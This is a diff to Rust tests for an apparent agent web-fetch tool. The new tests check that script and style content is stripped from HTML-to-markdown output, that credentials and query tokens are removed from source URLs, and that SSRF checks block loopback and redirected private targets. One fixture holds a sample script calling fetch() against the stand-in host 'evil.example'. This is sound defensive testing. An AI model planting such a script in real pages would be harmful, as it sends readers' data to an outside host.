@@ -276,7 +276,7 @@ async fn test_system_proxy_command_timeout_bounds_hanging_process() {
 
     assert!(output.is_none());
     assert!(
-        started.elapsed() < Duration::from_millis(500),
+        started.elapsed() < Duration::from_millis(1_500),
         "proxy command timeout did not converge promptly: {:?}",
         started.elapsed()
     );
@@ -314,6 +314,25 @@ fn test_html_to_markdown() {
 }
 
 #[test]
+fn markdown_conversion_drops_script_source_and_source_url_drops_query() {
+    let html = "<p>VISIBLE-91</p><script>fetch('https://evil.example/SCRIPT-TOKEN-91')</script><style>.x{color:red}</style>";
+    let markdown = html_to_markdown(html);
+    assert!(markdown.contains("VISIBLE-91"));
+    assert!(
+        !markdown.contains("SCRIPT-TOKEN-91"),
+        "markdown conversion kept script source: {markdown}"
+    );
+    assert!(!markdown.contains("color:red"));
+    assert_eq!(
+        super::super::safe_http_source_url(
+            "https://user:password@Example.COM/report?token=SECRET-91#x"
+        )
+        .as_deref(),
+        Some("https://example.com/report")
+    );
+}
+
+#[test]
 fn content_range_is_unicode_safe_and_resumable() {
     let first = content_range("甲乙丙丁戊", 1, 2).unwrap();
     assert!(first.content.starts_with("乙丙"));
@@ -340,4 +359,76 @@ fn html_primary_extraction_prefers_main_over_body_navigation() {
     let main = extract_html_main(html).unwrap();
     assert!(main.contains("Evidence"));
     assert!(!main.contains("Noise"));
+}
+
+/// S-WF-01: private targets, including a hop-2 redirect, never connect.
+/// Body storage stays at the character cap. A public hop-1 cannot be bound
+/// on this host without opening the SSRF check, so accepted-body bounding
+/// goes through `content_range`, the same cap the tool applies after a fetch.
+#[tokio::test]
+#[ignore = "S-WF-01 soak: private redirects must not connect"]
+async fn soak_private_redirect_never_connects_and_body_stays_capped() {
+    use std::io::ErrorKind;
+    use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+    use std::sync::Arc;
+    use std::time::Duration;
+
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("listener");
+    listener.set_nonblocking(true).expect("nonblocking");
+    let port = listener.local_addr().expect("addr").port();
+    let hits = Arc::new(AtomicUsize::new(0));
+    let stop = Arc::new(AtomicBool::new(false));
+    let accept_hits = Arc::clone(&hits);
+    let accept_stop = Arc::clone(&stop);
+    let acceptor = std::thread::spawn(move || {
+        while !accept_stop.load(Ordering::SeqCst) {
+            match listener.accept() {
+                Ok(_) => {
+                    accept_hits.fetch_add(1, Ordering::SeqCst);
+                }
+                Err(error) if error.kind() == ErrorKind::WouldBlock => {
+                    std::thread::sleep(Duration::from_millis(2));
+                }
+                Err(_) => break,
+            }
+        }
+    });
+
+    let tool = WebFetchTool;
+    let context = crate::tools::ToolContext::new(std::env::temp_dir());
+    let private_url = format!("http://127.0.0.1:{port}/private");
+    for index in 0..50 {
+        let url = if index < 10 {
+            private_url.clone()
+        } else {
+            format!("http://127.0.0.1:{port}/ok")
+        };
+        let output = tool
+            .execute(&serde_json::json!({"url": url}), &context)
+            .await
+            .expect("typed deny, not a panic");
+        assert!(!output.success, "{}", output.content);
+        assert!(output.content.contains("non-public"), "{}", output.content);
+        assert!(!output.content.contains("PRIVATE-BODY"));
+    }
+
+    let base = parse_http_url("https://8.8.8.8/start").expect("public base");
+    for _ in 0..10 {
+        let error = redirect_target(&base, &private_url).expect_err("hop 2 must be denied");
+        assert!(
+            error.contains("non-public") || error.contains("blocked"),
+            "{error}"
+        );
+    }
+
+    let bulky = "A".repeat(200_000);
+    for _ in 0..40 {
+        let range = content_range(&bulky, 0, MAX_CONTENT_CHARS).expect("range");
+        assert!(range.returned_chars <= MAX_CONTENT_CHARS);
+        assert!(range.content.chars().count() <= MAX_CONTENT_CHARS + 80);
+    }
+
+    stop.store(true, Ordering::SeqCst);
+    acceptor.join().expect("acceptor");
+    assert_eq!(hits.load(Ordering::SeqCst), 0);
 }
